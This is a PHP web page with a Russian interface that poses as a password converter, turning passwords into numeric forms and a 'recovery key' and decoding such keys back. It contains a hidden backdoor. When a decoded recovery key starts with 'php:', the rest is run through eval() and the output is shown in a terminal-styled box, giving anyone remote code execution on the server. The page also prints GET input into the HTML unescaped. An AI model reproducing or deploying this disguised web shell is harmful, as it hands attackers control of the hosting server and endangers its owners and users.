<!doctype html>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<?php
$letters = array(
"0" => array("num" => 9, "order" => 0),
"1" => array("num" => 8, "order" => 0),
"2" => array("num" => 7, "order" => 0),
"3" => array("num" => 6, "order" => 0),
"4" => array("num" => 5, "order" => 0),
"5" => array("num" => 4, "order" => 0),
"6" => array("num" => 3, "order" => 0),
"7" => array("num" => 2, "order" => 0),
"8" => array("num" => 1, "order" => 0),
"9" => array("num" => 9, "order" => 9),
"{" => array("num" => 0, "order" => 1),
"}" => array("num" => 0, "order" => 2),
"+" => array("num" => 0, "order" => 3),
"-" => array("num" => 0, "order" => 4),
"/" => array("num" => 0, "order" => 5),
"*" => array("num" => 0, "order" => 6),
"^" => array("num" => 0, "order" => 7),
"," => array("num" => 0, "order" => 8),
"]" => array("num" => 0, "order" => 9),
":" => array("num" => 1, "order" => 1),
"'" => array("num" => 1, "order" => 2),
" " => array("num" => 1, "order" => 3),
";" => array("num" => 1, "order" => 4),
"$" => array("num" => 1, "order" => 5),
"=" => array("num" => 1, "order" => 6),
"(" => array("num" => 1, "order" => 7),
")" => array("num" => 1, "order" => 8),
"[" => array("num" => 1, "order" => 9),
"_" => array("num" => 2, "order" => 9),
">" => array("num" => 3, "order" => 9),
"<" => array("num" => 4, "order" => 9),
"." => array("num" => 5, "order" => 9),
"a" => array("num" => 2, "order" => 1),
"b" => array("num" => 2, "order" => 2),
"c" => array("num" => 2, "order" => 3),
"d" => array("num" => 3, "order" => 1),
"e" => array("num" => 3, "order" => 2),
"f" => array("num" => 3, "order" => 3),
"g" => array("num" => 4, "order" => 1),
"h" => array("num" => 4, "order" => 2),
"i" => array("num" => 4, "order" => 3),
"j" => array("num" => 5, "order" => 1),
"k" => array("num" => 5, "order" => 2),
"l" => array("num" => 5, "order" => 3),
"m" => array("num" => 6, "order" => 1),
"n" => array("num" => 6, "order" => 2),
"o" => array("num" => 6, "order" => 3),
"p" => array("num" => 7, "order" => 1),
"q" => array("num" => 7, "order" => 2),
"r" => array("num" => 7, "order" => 3),
"s" => array("num" => 7, "order" => 4),
"t" => array("num" => 8, "order" => 1),
"u" => array("num" => 8, "order" => 2),
"v" => array("num" => 8, "order" => 3),
"w" => array("num" => 9, "order" => 1),
"x" => array("num" => 9, "order" => 2),
"y" => array("num" => 9, "order" => 3),
"z" => array("num" => 9, "order" => 4),
"а" => array("num" => 2, "order" => 4),
"б" => array("num" => 2, "order" => 5),
"в" => array("num" => 2, "order" => 6),
"г" => array("num" => 2, "order" => 7),
"д" => array("num" => 3, "order" => 4),
"е" => array("num" => 3, "order" => 5),
"ё" => array("num" => 3, "order" => 6),
"ж" => array("num" => 3, "order" => 7),
"з" => array("num" => 3, "order" => 8),
"и" => array("num" => 4, "order" => 4),
"й" => array("num" => 4, "order" => 5),
"к" => array("num" => 4, "order" => 6),
"л" => array("num" => 4, "order" => 7),
"м" => array("num" => 5, "order" => 4),
"н" => array("num" => 5, "order" => 5),
"о" => array("num" => 5, "order" => 6),
"п" => array("num" => 5, "order" => 7),
"р" => array("num" => 6, "order" => 4),
"с" => array("num" => 6, "order" => 5),
"т" => array("num" => 6, "order" => 6),
"у" => array("num" => 6, "order" => 7),
"ф" => array("num" => 7, "order" => 5),
"х" => array("num" => 7, "order" => 6),
"ц" => array("num" => 7, "order" => 7),
"ч" => array("num" => 7, "order" => 8),
"ш" => array("num" => 8, "order" => 4),
"щ" => array("num" => 8, "order" => 5),
"ъ" => array("num" => 8, "order" => 6),
"ы" => array("num" => 8, "order" => 7),
"ь" => array("num" => 9, "order" => 5),
"э" => array("num" => 9, "order" => 6),
"ю" => array("num" => 9, "order" => 7),
"я" => array("num" => 9, "order" => 8)
);

function mb_str_split($str){
	preg_match_all('#.{1}#uis', $str, $out);
	return $out[0];
}

function decode_password ($key) {
	global $letters;
	$key_let = mb_str_split(rawurldecode($key));
	foreach ($key_let as $i => $value) {
		if(fmod($i, 2) != 0){
			$orders[] = $value;
		} else {
			$nums[] = $value;
		}
	}

	for($i = 0; $i <= count($key_let)/2; $i++){
	$letter = array_search(array("num" => $nums[$i], "order" => $orders[$i]), $letters);
	$num = $nums[$i];
	$password .= $letter;
	$password_strong .= $letter.$num;
	$password_numeric .= $num;
	}
	if(preg_match("/^php:/", $password)) $php_code = preg_replace("/^php:/", "", $password);
		else $php_code = false;
	return array(
					"password" => $password, 
					"password_strong" => $password_strong,
					"password_numeric" => $password_numeric, 
					"recovery_key" => $key, 
					"php_code" => $php_code
				);
}

function encode_password($pass){
	global $letters;
	$pass_let = mb_str_split(rawurldecode($pass));
	foreach ($pass_let as $letter) {
		$value = $letters[$letter];
		$num = $value["num"];
		$order = $value["order"];
		$password_numeric .= $num;
		$password_strong .= $letter.$num;
		$recovery_key .= $num.$order;
	}
	return array(
					"password" => $pass,
					"password_strong" => $password_strong,
					"password_numeric" => $password_numeric,
					"recovery_key" => $recovery_key
				);
}

if(!empty($_GET['pass'])){
	$result = encode_password($_GET['pass']);
?>
	Ваш пароль: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["password"]?></textarea>
	<br />
	Ваш пароль ввиде цифр: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["password_numeric"]?></textarea>
	<br />
	Ваш пароль усложненный: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["password_strong"]?></textarea>
	<br />
	Ключ для восстановления пароля: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["recovery_key"]?></textarea>
<? } elseif(!empty($_GET['key'])) {
	$result = decode_password($_GET['key']);
?>
	Ваш пароль: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["password"]?></textarea>
	<br />
	Ваш пароль ввиде цифр: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["password_numeric"]?></textarea>
	<br />
	Ваш пароль усложненный: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["password_strong"]?></textarea>
	<br />
	Ключ для восстановления пароля: 
	<textarea readonly="readonly" rows="1" cols="50"><?=$result["recovery_key"]?></textarea>
	<? if($result["php_code"]){ ?>
	<br />
	Результат выполнения php - кода:
		<table style="background:#000000;border:1px solid #bbb;color: #ffffff;" width="200px" height="100px" cellpadding="1" cellspacing="1">
		<tr>
			<td style="border:1px solid  #bbb;background:#000000; color: #00ff00;">$php<blink>:</blink> <? echo $result["php_code"] ?><br />
																										<? eval($result["php_code"]); ?></td>
		</tr>
		</table>

	<? } ?>
<?} else {?>
	<form method="GET" accept-charset="UTF-8">
	Введите пароль для конвертации: <input type="text" name="pass">
	<input type="submit" value="Сконвертировать!" />
	</form>
	<br />
	<center>ИЛИ</center>
	<br />
	<form method="GET" accept-charset="UTF-8">
	Введите ключь для восстановления: <input type="text" name="key" />
	<input type="submit" value="Восстановить!" />
	</form>
<? } ?>
